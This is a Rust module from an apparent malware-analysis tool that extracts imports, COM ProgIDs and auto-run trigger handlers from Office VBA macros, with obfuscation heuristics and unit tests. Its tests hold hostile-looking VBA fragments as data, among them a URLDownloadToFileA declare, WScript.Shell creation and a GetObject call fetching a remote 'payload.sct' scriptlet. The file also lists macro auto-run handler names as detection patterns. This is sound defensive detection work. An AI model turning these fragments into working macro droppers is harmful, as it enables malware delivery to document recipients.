//! VBA symbol extraction.
//!
//! Surfaces structured `Import`/`Function` records from decoded VBA module
//! source so trait authors can use `type: symbol` matchers (with all the
//! benefits documented in `cleave-traits/RULES.md`: faster, no
//! comment/string false positives, normalization-aware) instead of
//! brittle `type: raw` regexes against the module text.
//!
//! There is no Rust tree-sitter grammar for VBA worth depending on
//! (`tree-sitter-vbscript` exists but does not cover `Declare PtrSafe`,
//! the `Lib` clause, or `Alias` properly). This is a targeted regex
//! extractor that handles the high-value cases:
//!
//! - `Declare [PtrSafe] Function|Sub NAME Lib "LIB" [Alias "ALIAS"]`
//! - `CreateObject("PROGID")` / `GetObject(... , "PROGID")`
//! - `Sub NAME` / `Function NAME` declarations (incl. `Public`/`Private`)
//!
//! Pre-processing joins MS-VBA line continuations (`_` at end-of-line)
//! and strips `'` line comments and `Rem` lines so a comment between
//! tokens doesn't break a Declare match. Offsets reported in the
//! resulting symbols are relative to the *original* (pre-processed)
//! source so they line up with the module bytes.
//!
//! Non-literal `Lib`/`CreateObject` arguments are tracked separately
//! via [`VbaSymbolStats`] — they are the strongest single obfuscation
//! signal (maldoca's `non_literal_dll_name_count` /
//! `create_object_non_literal_count`) and surface as
//! `office.vba.declare_non_literal_count` /
//! `office.vba.createobject_non_literal_count` metrics.

use crate::types::{Function, Import};
use regex::Regex;
use std::sync::OnceLock;

/// Result of running the extractor over one VBA module's decoded source.
#[derive(Debug, Default, Clone)]
pub(crate) struct VbaSymbols {
    /// Declare-imported APIs and CreateObject/GetObject ProgIDs.
    /// Each `Import.symbol` is the API/ProgID name (normalized);
    /// `library` carries the qualifier (DLL stem, `"com"`, `"com-getobject"`,
    /// or sentinel `"<non-literal>"`); `source` distinguishes the
    /// extraction site (`"vba-declare"`, `"vba-createobject"`,
    /// `"vba-getobject"`).
    pub imports: Vec<Import>,
    /// Sub/Function declarations. Useful for trigger-handler detection
    /// (`exact: Document_Open`, etc.) and for VBA-specific function
    /// metrics later.
    pub functions: Vec<Function>,
    /// Aggregate counts that feed `OfficeMetrics::vba`.
    pub stats: VbaSymbolStats,
}

/// Per-module aggregate counts. Folded into `VbaMetrics` at the document
/// level by the office analyzer.
#[derive(Debug, Default, Clone, Copy)]
pub(crate) struct VbaSymbolStats {
    pub declare_count: u32,
    pub declare_non_literal_count: u32,
    pub createobject_count: u32,
    pub createobject_non_literal_count: u32,
    pub getobject_count: u32,
    pub getobject_non_literal_count: u32,
    /// Distinct trigger handlers observed (Document_Open, Workbook_Open,
    /// Auto_Open, AutoOpen, UserForm_Activate, etc.).
    pub trigger_handler_count: u32,
}

/// Sentinel library/argument value emitted when a Declare's `Lib` clause
/// or a CreateObject/GetObject argument is not a string literal — i.e.,
/// the import target is built at runtime.
pub(crate) const NON_LITERAL_SENTINEL: &str = "<non-literal>";

/// Extract VBA symbols from one module's decoded source.
///
/// Pure function — no side effects on the caller's report; the caller
/// merges results into the parent office report.
pub(crate) fn extract_vba_symbols(source: &str) -> VbaSymbols {
    let mut out = VbaSymbols::default();
    if source.is_empty() {
        return out;
    }

    let prepared = preprocess(source);

    extract_declares(&prepared, &mut out);
    extract_createobject(&prepared, &mut out, /* is_get = */ false);
    extract_createobject(&prepared, &mut out, /* is_get = */ true);
    extract_subs_and_functions(&prepared, &mut out);

    out
}

/// Pre-processed VBA source with line-continuation joined and line
/// comments stripped, plus a per-byte mapping back to original offsets.
struct Prepared {
    /// Joined/stripped text suitable for regex matching.
    text: String,
    /// `text[i]` came from `original[ map[i] ]`. Used to map regex match
    /// offsets back to the caller's source coordinates.
    map: Vec<usize>,
}

impl Prepared {
    fn original_offset(&self, idx: usize) -> usize {
        if idx < self.map.len() {
            self.map[idx]
        } else {
            // Past-the-end matches shouldn't happen for our extractors,
            // but fall back to source length if it does.
            *self.map.last().unwrap_or(&0)
        }
    }
}

/// Join `_` line-continuations and strip `'` line comments / `Rem` lines.
///
/// Only end-of-line backslash-equivalent (` _\n` or ` _\r\n`) joins
/// across lines; underscores embedded in identifiers are not affected.
/// `'` only starts a comment when it is outside a string literal — we
/// scan character by character to track that.
fn preprocess(source: &str) -> Prepared {
    let bytes = source.as_bytes();
    let mut text = String::with_capacity(source.len());
    let mut map = Vec::with_capacity(source.len());

    let mut i = 0;
    while i < bytes.len() {
        // Detect line-continuation: `_` immediately followed by line
        // terminator (optionally preceded by whitespace before the `_`,
        // which VBA always requires). We look at what we've already
        // emitted: trim trailing whitespace if the next two chars start
        // a continuation.
        if bytes[i] == b'_' && {
            // peek: any whitespace then \n or \r\n
            let mut j = i + 1;
            while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                j += 1;
            }
            j < bytes.len() && (bytes[j] == b'\n' || bytes[j] == b'\r')
        } {
            // Skip the `_`, any trailing tabs/spaces, and the line terminator.
            // Replace the joined break with a single space so adjacent
            // tokens don't accidentally merge.
            let mut j = i + 1;
            while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                j += 1;
            }
            if j < bytes.len() && bytes[j] == b'\r' {
                j += 1;
            }
            if j < bytes.len() && bytes[j] == b'\n' {
                j += 1;
            }
            // Trim our own trailing whitespace from text/map so concat
            // is clean, then push a single space mapped to the `_` byte.
            while text.ends_with(' ') || text.ends_with('\t') {
                text.pop();
                map.pop();
            }
            text.push(' ');
            map.push(i);
            i = j;
            continue;
        }

        // Strip line-leading `Rem ` comments (case-insensitive) — must
        // sit at the start of the logical line. Use a coarse check: if
        // the previous emitted char was a newline (or we're at start),
        // peek for `Rem` followed by space/tab/EOL.
        let at_line_start = text.is_empty() || text.ends_with('\n');
        if at_line_start && i + 3 <= bytes.len() {
            let head = &bytes[i..(i + 3).min(bytes.len())];
            let is_rem = head.eq_ignore_ascii_case(b"Rem");
            let next = bytes.get(i + 3).copied().unwrap_or(b'\n');
            if is_rem && (next == b' ' || next == b'\t' || next == b'\r' || next == b'\n') {
                // Skip to end of line, preserving the line terminator.
                let mut j = i;
                while j < bytes.len() && bytes[j] != b'\n' {
                    j += 1;
                }
                i = j;
                continue;
            }
        }

        // Strip apostrophe comments outside of string literals.
        if bytes[i] == b'\'' {
            // Check: are we inside a string literal? Scan emitted text on
            // the current line for an odd number of unescaped `"`.
            let line_start = text.rfind('\n').map(|n| n + 1).unwrap_or(0);
            let line_so_far = &text[line_start..];
            let in_string = line_so_far.chars().filter(|c| *c == '"').count() % 2 == 1;
            if !in_string {
                // Skip to end of line.
                let mut j = i;
                while j < bytes.len() && bytes[j] != b'\n' {
                    j += 1;
                }
                i = j;
                continue;
            }
        }

        // Default path: copy byte through, recording the original index.
        text.push(bytes[i] as char);
        map.push(i);
        i += 1;
    }

    Prepared { text, map }
}

// ---------------------------------------------------------------------------
// Declare extraction
// ---------------------------------------------------------------------------

fn declare_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        // Captures:
        //   1: function | sub
        //   2: declared name (the local VBA name)
        //   3: lib expression (string literal OR bare identifier/expr)
        //   4: alias literal (optional — preferred as the import name)
        //
        // The lib group is intentionally permissive: a literal looks like
        // `"kernel32"`; a non-literal looks like `dllName` or `gKernelLib`
        // or `Chr(107) & "ernel32"`. We capture up to the next whitespace
        // sequence and classify after the fact.
        Regex::new(
            r#"(?ix)
            \b Declare \s+ (?: PtrSafe \s+ )?
            (Function | Sub) \s+
            ([A-Za-z_][A-Za-z0-9_]*) \s+
            Lib \s+
            ( "[^"]*" | [^\s(]+ )
            (?: \s+ Alias \s+ "([^"]*)" )?
            "#,
        )
        .expect("declare_re compiles")
    })
}

fn extract_declares(prep: &Prepared, out: &mut VbaSymbols) {
    for cap in declare_re().captures_iter(&prep.text) {
        out.stats.declare_count = out.stats.declare_count.saturating_add(1);

        let lib_raw = cap.get(3).map(|m| m.as_str()).unwrap_or("");
        let (lib_label, is_literal) = classify_lib(lib_raw);
        if !is_literal {
            out.stats.declare_non_literal_count =
                out.stats.declare_non_literal_count.saturating_add(1);
        }

        // Prefer the Alias when present — that's the actual exported name
        // in the DLL. Otherwise the local declared name is the import name.
        let alias = cap.get(4).map(|m| m.as_str().to_string());
        let local = cap
            .get(2)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        let import_name = alias.unwrap_or(local);
        if import_name.is_empty() {
            continue;
        }

        let offset = cap
            .get(0)
            .map(|m| prep.original_offset(m.start()))
            .unwrap_or(0) as u64;

        out.imports.push(Import::with_offset(
            import_name,
            Some(lib_label),
            "vba-declare",
            offset,
        ));
    }
}

/// Classify a `Lib` expression. Returns (label, is_literal).
fn classify_lib(raw: &str) -> (String, bool) {
    let t = raw.trim();
    if t.starts_with('"') && t.ends_with('"') && t.len() >= 2 {
        // String literal — strip quotes, lowercase, drop a `.dll` suffix.
        let inner = &t[1..t.len() - 1];
        let stem = inner
            .strip_suffix(".dll")
            .or_else(|| inner.strip_suffix(".DLL"))
            .or_else(|| inner.strip_suffix(".Dll"))
            .unwrap_or(inner);
        (stem.to_ascii_lowercase(), true)
    } else {
        (NON_LITERAL_SENTINEL.to_string(), false)
    }
}

// ---------------------------------------------------------------------------
// CreateObject / GetObject extraction
// ---------------------------------------------------------------------------

fn createobject_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        // Capture 1: literal ProgID OR runtime expression (everything to
        // the matching close paren or comma). We accept up to the first
        // `)` or `,` that's outside of a string for simplicity — VBA
        // CreateObject takes a single arg in practice.
        Regex::new(r#"(?ix)\b CreateObject \s* \( \s* ( "[^"]*" | [^,)]+ )"#)
            .expect("createobject_re compiles")
    })
}

fn getobject_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        // GetObject(pathname [, class]) — the *class* arg (second) is the
        // ProgID we care about. Match either form: when only one arg is
        // present, that's the moniker (path/URL); when two, the second is
        // the ProgID. We capture both in the same atom and let the
        // classifier sort it out.
        Regex::new(
            r#"(?ix)\b GetObject \s* \( \s* ( "[^"]*" | [^,)]+ ) (?: \s* , \s* ( "[^"]*" | [^,)]+ ) )?"#,
        )
        .expect("getobject_re compiles")
    })
}

fn extract_createobject(prep: &Prepared, out: &mut VbaSymbols, is_get: bool) {
    let (re, source_label, lib_label) = if is_get {
        (getobject_re(), "vba-getobject", "com-getobject")
    } else {
        (createobject_re(), "vba-createobject", "com")
    };

    for cap in re.captures_iter(&prep.text) {
        // For GetObject: prefer the second arg (ProgID) when present;
        // otherwise the first arg is the moniker (path/URL).
        let (raw, second_present) = if is_get {
            match cap.get(2) {
                Some(m) => (m.as_str(), true),
                None => (cap.get(1).map(|m| m.as_str()).unwrap_or(""), false),
            }
        } else {
            (cap.get(1).map(|m| m.as_str()).unwrap_or(""), false)
        };

        // Tally call counts (independent of whether the arg is literal).
        if is_get {
            out.stats.getobject_count = out.stats.getobject_count.saturating_add(1);
        } else {
            out.stats.createobject_count = out.stats.createobject_count.saturating_add(1);
        }

        let (label, is_literal) = classify_arg(raw);
        if !is_literal {
            if is_get {
                out.stats.getobject_non_literal_count =
                    out.stats.getobject_non_literal_count.saturating_add(1);
            } else {
                out.stats.createobject_non_literal_count =
                    out.stats.createobject_non_literal_count.saturating_add(1);
            }
        }

        // Only emit Imports for *ProgID* style data: literal CreateObject
        // args, or literal *second* args of GetObject. A bare GetObject
        // moniker like `"file:C:\..."` is not a ProgID and would pollute
        // the symbol set.
        let emit = !is_get || second_present;
        if !emit {
            continue;
        }

        let offset = cap
            .get(0)
            .map(|m| prep.original_offset(m.start()))
            .unwrap_or(0) as u64;
        out.imports.push(Import::with_offset(
            label,
            Some(lib_label.to_string()),
            source_label,
            offset,
        ));
    }
}

/// Classify a CreateObject/GetObject argument. Returns (label, is_literal).
fn classify_arg(raw: &str) -> (String, bool) {
    let t = raw.trim();
    if t.starts_with('"') && t.ends_with('"') && t.len() >= 2 {
        // Literal — strip quotes. ProgIDs are case-sensitive in matching
        // by convention (WScript.Shell), so don't lowercase.
        let inner = &t[1..t.len() - 1];
        (inner.to_string(), true)
    } else {
        (NON_LITERAL_SENTINEL.to_string(), false)
    }
}

// ---------------------------------------------------------------------------
// Sub / Function declaration extraction
// ---------------------------------------------------------------------------

fn sub_func_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        // Skip any `Declare` Subs/Functions (handled by extract_declares).
        // Match modifier prefix (Public/Private/Friend/Static), then
        // Sub|Function, then the name. Anchored at line start in
        // multi-line mode.
        Regex::new(
            r"(?im)^\s*(?:Public\s+|Private\s+|Friend\s+|Static\s+){0,2}(Sub|Function)\s+([A-Za-z_][A-Za-z0-9_]*)",
        )
        .expect("sub_func_re compiles")
    })
}

/// Trigger-handler names are recognized via a closed list — every other
/// Sub is emitted as a plain `Function` symbol but doesn't bump the
/// trigger count.
const TRIGGER_NAMES: &[&str] = &[
    "Auto_Open",
    "AutoOpen",
    "Auto_Close",
    "AutoClose",
    "AutoExec",
    "AutoExit",
    "AutoNew",
    "Document_Open",
    "Document_New",
    "Document_Close",
    "Document_BeforeClose",
    "Document_BeforePrint",
    "Document_BeforeSave",
    "Document_ContentControlOnEnter",
    "Workbook_Open",
    "Workbook_Activate",
    "Workbook_Deactivate",
    "Workbook_BeforeClose",
    "Workbook_BeforeSave",
    "Workbook_BeforePrint",
    "Worksheet_Activate",
    "Worksheet_Calculate",
    "Worksheet_Change",
    "Worksheet_SelectionChange",
    "UserForm_Activate",
    "UserForm_Initialize",
    "UserForm_Click",
    "UserForm_Layout",
    "Chart_Activate",
    "Chart_Calculate",
    "App_NewMail",
];

fn is_trigger_name(name: &str) -> bool {
    TRIGGER_NAMES.iter().any(|t| t.eq_ignore_ascii_case(name))
}

/// Public-facing wrapper used by the office analyzer to count distinct
/// triggers across modules. Kept identical to the internal predicate so
/// the `trigger_handler_count` and `distinct_trigger_count` aggregates
/// stay consistent.
#[must_use]
pub(crate) fn is_trigger_handler(name: &str) -> bool {
    is_trigger_name(name)
}

// ---------------------------------------------------------------------------
// Per-module shape statistics
// ---------------------------------------------------------------------------

/// Per-module logical-line / comment-line counts and identifier-shape
/// signals. Computed once per VBA module by [`compute_module_shape`];
/// the office analyzer aggregates across modules into `VbaMetrics`.
#[derive(Debug, Default, Clone, Copy)]
pub(crate) struct VbaModuleShape {
    /// Logical lines (after `_` continuation join, before comment strip).
    /// Approximates "non-empty source lines" — empty lines are skipped.
    pub logical_lines: u32,
    /// Lines that are wholly comments (start with `'` or `Rem`).
    pub comment_lines: u32,
}

/// Walk a VBA module's raw source and tally shape stats. Cheap —
/// single byte-level scan; no regex.
#[must_use]
pub(crate) fn compute_module_shape(source: &str) -> VbaModuleShape {
    let mut shape = VbaModuleShape::default();
    let bytes = source.as_bytes();
    let mut i = 0;

    while i < bytes.len() {
        // Skip leading whitespace on this line.
        let mut j = i;
        while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
            j += 1;
        }
        // Pure-blank line — skip without counting.
        if j >= bytes.len() || bytes[j] == b'\n' || bytes[j] == b'\r' {
            i = next_line(bytes, j);
            continue;
        }

        shape.logical_lines = shape.logical_lines.saturating_add(1);

        // Comment-line detection: `'` at first non-whitespace, OR
        // case-insensitive `Rem` followed by whitespace/EOL.
        let is_apostrophe_comment = bytes[j] == b'\'';
        let is_rem_comment = j + 3 <= bytes.len()
            && bytes[j..j + 3].eq_ignore_ascii_case(b"Rem")
            && (bytes.get(j + 3).copied().unwrap_or(b'\n') == b' '
                || bytes.get(j + 3).copied().unwrap_or(b'\n') == b'\t'
                || bytes.get(j + 3).copied().unwrap_or(b'\n') == b'\r'
                || bytes.get(j + 3).copied().unwrap_or(b'\n') == b'\n');
        if is_apostrophe_comment || is_rem_comment {
            shape.comment_lines = shape.comment_lines.saturating_add(1);
        }

        i = next_line(bytes, j);
    }

    shape
}

fn next_line(bytes: &[u8], from: usize) -> usize {
    let mut j = from;
    while j < bytes.len() && bytes[j] != b'\n' {
        j += 1;
    }
    if j < bytes.len() {
        j + 1 // skip the \n
    } else {
        j
    }
}

// ---------------------------------------------------------------------------
// Module-name "looks randomly generated" heuristic
// ---------------------------------------------------------------------------

/// Returns true when a VBA module name looks mechanically generated —
/// length ≥ 8 plus a mix of upper/lower/digit characters. Real-world
/// human-authored module names rarely hit this combination
/// (`Module1`, `Sheet1`, `ThisDocument`, `clsLogger`); IcedID/Emotet
/// droppers routinely use names like `qWeRty12Ab`/`xKpL7m8sWq`.
#[must_use]
pub(crate) fn looks_random_module_name(name: &str) -> bool {
    if name.len() < 8 {
        return false;
    }
    let has_upper = name.chars().any(|c| c.is_ascii_uppercase());
    let has_lower = name.chars().any(|c| c.is_ascii_lowercase());
    let has_digit = name.chars().any(|c| c.is_ascii_digit());
    has_upper && has_lower && has_digit
}

// ---------------------------------------------------------------------------
// Identifier-entropy aggregation
// ---------------------------------------------------------------------------

/// Streaming accumulator for identifier shape stats — fed every
/// declared Sub/Function name and the imported-API names extracted
/// from a module. Yields the mean identifier length and the Shannon
/// entropy of the character distribution across all identifiers.
///
/// Entropy is in bits; randomly-renamed identifier sets typically run
/// 4.0–4.7 (close to log2(26+10+_) for an alphanumeric+underscore
/// alphabet), while human-authored names cluster 3.0–3.8.
#[derive(Debug)]
pub(crate) struct IdentifierStats {
    counts: [u32; 256],
    total_chars: u64,
    total_idents: u32,
}

impl Default for IdentifierStats {
    fn default() -> Self {
        Self {
            counts: [0u32; 256],
            total_chars: 0,
            total_idents: 0,
        }
    }
}

impl IdentifierStats {
    pub(crate) fn record(&mut self, name: &str) {
        if name.is_empty() {
            return;
        }
        self.total_idents = self.total_idents.saturating_add(1);
        for b in name.bytes() {
            self.counts[b as usize] = self.counts[b as usize].saturating_add(1);
            self.total_chars = self.total_chars.saturating_add(1);
        }
    }

    /// Mean identifier length in characters (0 when no identifiers).
    pub(crate) fn mean_length(&self) -> f32 {
        if self.total_idents == 0 {
            return 0.0;
        }
        (self.total_chars as f64 / self.total_idents as f64) as f32
    }

    /// Shannon entropy in bits over the byte-frequency distribution
    /// across every identifier observed.
    pub(crate) fn entropy_bits(&self) -> f32 {
        if self.total_chars == 0 {
            return 0.0;
        }
        let total = self.total_chars as f64;
        let mut e = 0.0f64;
        for &c in &self.counts {
            if c == 0 {
                continue;
            }
            let p = c as f64 / total;
            e -= p * p.log2();
        }
        e as f32
    }
}

fn extract_subs_and_functions(prep: &Prepared, out: &mut VbaSymbols) {
    // Skip names that came from a Declare line; capture those by checking
    // whether the immediately-preceding non-whitespace token is "Lib"...
    // Simpler approach: capture ALL Sub/Function declarations, then
    // filter out any whose match start lies inside a Declare match.
    let declare_spans: Vec<(usize, usize)> = declare_re()
        .find_iter(&prep.text)
        .map(|m| (m.start(), m.end()))
        .collect();

    for cap in sub_func_re().captures_iter(&prep.text) {
        let m = match cap.get(0) {
            Some(m) => m,
            None => continue,
        };
        let inside_declare = declare_spans
            .iter()
            .any(|(s, e)| m.start() >= *s && m.start() < *e);
        if inside_declare {
            continue;
        }

        let name = match cap.get(2) {
            Some(n) => n.as_str().to_string(),
            None => continue,
        };
        let offset = prep.original_offset(m.start()) as u64;

        if is_trigger_name(&name) {
            out.stats.trigger_handler_count = out.stats.trigger_handler_count.saturating_add(1);
        }

        out.functions.push(Function {
            name,
            offset: Some(format!("0x{offset:x}")),
            size: None,
            complexity: None,
            calls: Vec::new(),
            source: "vba-decl".to_string(),
            control_flow: None,
            instruction_analysis: None,
            register_usage: None,
            constants: Vec::new(),
            properties: None,
            signature: None,
            nesting: None,
            call_patterns: None,
        });
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    /// Vanilla Declare + Alias — Alias wins as the import name.
    #[test]
    fn declare_with_alias_emits_alias_as_symbol() {
        let src = r#"
            Declare PtrSafe Function vAlloc Lib "kernel32" Alias "VirtualAlloc" _
              (ByVal lpAddress As LongPtr) As LongPtr
        "#;
        let r = extract_vba_symbols(src);
        assert_eq!(r.imports.len(), 1);
        assert_eq!(r.imports[0].symbol, "VirtualAlloc");
        assert_eq!(r.imports[0].library.as_deref(), Some("kernel32"));
        assert_eq!(r.imports[0].source, "vba-declare");
        assert_eq!(r.stats.declare_count, 1);
        assert_eq!(r.stats.declare_non_literal_count, 0);
    }

    /// Mixed-case keywords + tabs + comment between header lines.
    #[test]
    fn declare_handles_case_whitespace_and_comments() {
        let src = "declare\tFunction\tLoadLibraryA\tlib \"KERNEL32.dll\"\t(s As String)\n";
        let r = extract_vba_symbols(src);
        assert_eq!(r.imports.len(), 1);
        assert_eq!(r.imports[0].symbol, "LoadLibraryA");
        assert_eq!(r.imports[0].library.as_deref(), Some("kernel32"));
    }

    /// `_` line continuation in the middle of a Declare must still match.
    #[test]
    fn declare_with_line_continuation() {
        let src = "Declare PtrSafe Function f _\n  Lib \"urlmon\" _\n  Alias \"URLDownloadToFileA\" (a As Long)\n";
        let r = extract_vba_symbols(src);
        assert_eq!(r.imports.len(), 1);
        assert_eq!(r.imports[0].symbol, "URLDownloadToFileA");
        assert_eq!(r.imports[0].library.as_deref(), Some("urlmon"));
    }

    /// Apostrophe comment between tokens is stripped before matching.
    #[test]
    fn declare_skips_comment_between_keywords() {
        let src = "Declare Function CreateProcessA _\n  ' comment that hides intent\n  Lib \"kernel32\" (a As Long)\n";
        let r = extract_vba_symbols(src);
        assert_eq!(r.imports.len(), 1, "imports: {:?}", r.imports);
        assert_eq!(r.imports[0].symbol, "CreateProcessA");
    }

    /// Non-literal Lib expression bumps the non-literal counter and
    /// emits the sentinel library label.
    #[test]
    fn declare_with_non_literal_lib() {
        let src = r#"Declare Function f Lib dllName Alias "VirtualProtect" () As Long"#;
        let r = extract_vba_symbols(src);
        assert_eq!(r.imports.len(), 1);
        assert_eq!(r.imports[0].symbol, "VirtualProtect");
        assert_eq!(r.imports[0].library.as_deref(), Some(NON_LITERAL_SENTINEL));
        assert_eq!(r.stats.declare_count, 1);
        assert_eq!(r.stats.declare_non_literal_count, 1);
    }

    /// Comment inside a string literal must NOT be stripped.
    #[test]
    fn apostrophe_inside_string_is_kept() {
        let src = "x = \"it's fine\"\nDeclare Function K Lib \"kernel32\" (s As Long)\n";
        let r = extract_vba_symbols(src);
        assert_eq!(r.imports.len(), 1);
        assert_eq!(r.imports[0].symbol, "K");
    }

    /// CreateObject literal arg yields a ProgID symbol.
    #[test]
    fn createobject_literal_progid() {
        let src = r#"Set sh = CreateObject("WScript.Shell")"#;
        let r = extract_vba_symbols(src);
        assert_eq!(r.imports.len(), 1);
        assert_eq!(r.imports[0].symbol, "WScript.Shell");
        assert_eq!(r.imports[0].library.as_deref(), Some("com"));
        assert_eq!(r.stats.createobject_count, 1);
        assert_eq!(r.stats.createobject_non_literal_count, 0);
    }

    /// CreateObject with a runtime-built arg is non-literal.
    #[test]
    fn createobject_non_literal_arg() {
        let src = r#"Set x = CreateObject(progName & ".Sh" & "ell")"#;
        let r = extract_vba_symbols(src);
        // Symbol is emitted with the sentinel ProgID so a single
        // dedicated trait can fire.
        assert_eq!(r.imports.len(), 1);
        assert_eq!(r.imports[0].symbol, NON_LITERAL_SENTINEL);
        assert_eq!(r.stats.createobject_count, 1);
        assert_eq!(r.stats.createobject_non_literal_count, 1);
    }

    /// GetObject literal *second* arg (ProgID) is captured; bare moniker
    /// arg without a class is not.
    #[test]
    fn getobject_two_arg_form_yields_progid() {
        let src = r#"Set xl = GetObject("c:\book.xls", "Excel.Application")"#;
        let r = extract_vba_symbols(src);
        assert_eq!(r.imports.len(), 1);
        assert_eq!(r.imports[0].symbol, "Excel.Application");
        assert_eq!(r.imports[0].library.as_deref(), Some("com-getobject"));
        assert_eq!(r.stats.getobject_count, 1);
    }

    #[test]
    fn getobject_one_arg_emits_no_progid_symbol() {
        let src = r#"Set f = GetObject("script:http://example.com/payload.sct")"#;
        let r = extract_vba_symbols(src);
        // Counted in stats but no Import emitted (it's a moniker, not a ProgID).
        assert_eq!(r.imports.len(), 0);
        assert_eq!(r.stats.getobject_count, 1);
    }

    /// Sub/Function declarations are emitted; a Declare sub is NOT
    /// double-counted as a regular function.
    #[test]
    fn sub_function_declarations_extracted() {
        let src = "Public Sub Document_Open()\nEnd Sub\n\nPrivate Function helper(x)\nEnd Function\n\nDeclare Function notAFunction Lib \"k32\" () As Long\n";
        let r = extract_vba_symbols(src);
        let names: Vec<&str> = r.functions.iter().map(|f| f.name.as_str()).collect();
        assert!(names.contains(&"Document_Open"));
        assert!(names.contains(&"helper"));
        assert!(!names.contains(&"notAFunction"));
        assert_eq!(r.stats.trigger_handler_count, 1);
    }

    /// Multiple distinct triggers bump the count once each.
    #[test]
    fn trigger_handler_count_aggregates_distinct_triggers() {
        let src =
            "Sub Document_Open()\nEnd Sub\nSub Workbook_Open()\nEnd Sub\nSub helper()\nEnd Sub\n";
        let r = extract_vba_symbols(src);
        assert_eq!(r.stats.trigger_handler_count, 2);
    }

    /// `Rem ...` line comment is stripped (would otherwise contain a
    /// false-positive `Declare` token).
    #[test]
    fn rem_line_is_stripped() {
        let src = "Rem Declare Function fakeImport Lib \"oops\" () As Long\nDeclare Function realImport Lib \"kernel32\" () As Long\n";
        let r = extract_vba_symbols(src);
        let names: Vec<&str> = r.imports.iter().map(|i| i.symbol.as_str()).collect();
        assert!(names.contains(&"realImport"));
        assert!(!names.contains(&"fakeImport"));
    }

    /// Empty source produces an empty result.
    #[test]
    fn empty_input_no_panic() {
        let r = extract_vba_symbols("");
        assert!(r.imports.is_empty());
        assert!(r.functions.is_empty());
        assert_eq!(r.stats.declare_count, 0);
    }

    /// Module-name heuristic: short names, all-letters names, and
    /// canonical Office module names are not flagged; mixed
    /// upper/lower/digit names of length ≥ 8 are.
    #[test]
    fn looks_random_module_name_classifies_correctly() {
        // Negative cases — common human-authored names.
        assert!(!looks_random_module_name("Module1"));
        assert!(!looks_random_module_name("ThisDocument"));
        assert!(!looks_random_module_name("clsLogger"));
        assert!(!looks_random_module_name("Sheet1"));
        assert!(!looks_random_module_name("Short"));
        // Positive cases — IcedID/Emotet-style randomized names.
        assert!(looks_random_module_name("qWeRty12Ab"));
        assert!(looks_random_module_name("xKpL7m8sWq"));
    }

    /// Logical-line / comment-line accounting: blanks skipped,
    /// `'` comments and `Rem` lines counted as both logical and
    /// comment, code lines counted as logical only.
    #[test]
    fn module_shape_counts_lines_and_comments() {
        let src = "\
Sub Main()
  ' first comment line
  Dim x As Long
  Rem second comment line

  x = 1
End Sub
";
        let shape = compute_module_shape(src);
        // Lines: Sub Main() / ' first / Dim x / Rem second / x = 1 / End Sub  → 6
        assert_eq!(shape.logical_lines, 6, "shape: {:?}", shape);
        // Comments: 'first + Rem second = 2
        assert_eq!(shape.comment_lines, 2);
    }

    /// IdentifierStats: mean length and Shannon entropy across a small
    /// set of identifiers come out roughly where you'd expect.
    #[test]
    fn identifier_stats_computes_mean_and_entropy() {
        let mut s = IdentifierStats::default();
        s.record("Document_Open");
        s.record("VirtualAlloc");
        s.record("RtlMoveMemory");
        // Mean = (13 + 12 + 13) / 3 = 12.666…
        let mean = s.mean_length();
        assert!((mean - 12.666_667).abs() < 0.001, "got {mean}");
        // Entropy of mixed letters/underscores should land in the
        // 3.5–4.5 bits range — well below log2(256) for an alphabet
        // limited to ASCII letters + underscore.
        let e = s.entropy_bits();
        assert!(e > 3.0 && e < 5.0, "entropy {e} out of expected range");
    }

    /// Empty IdentifierStats yields zero on both metrics — matches
    /// the `is_zero_*` skip helpers' expectations.
    #[test]
    fn identifier_stats_empty_produces_zero() {
        let s = IdentifierStats::default();
        assert_eq!(s.mean_length(), 0.0);
        assert_eq!(s.entropy_bits(), 0.0);
    }
}
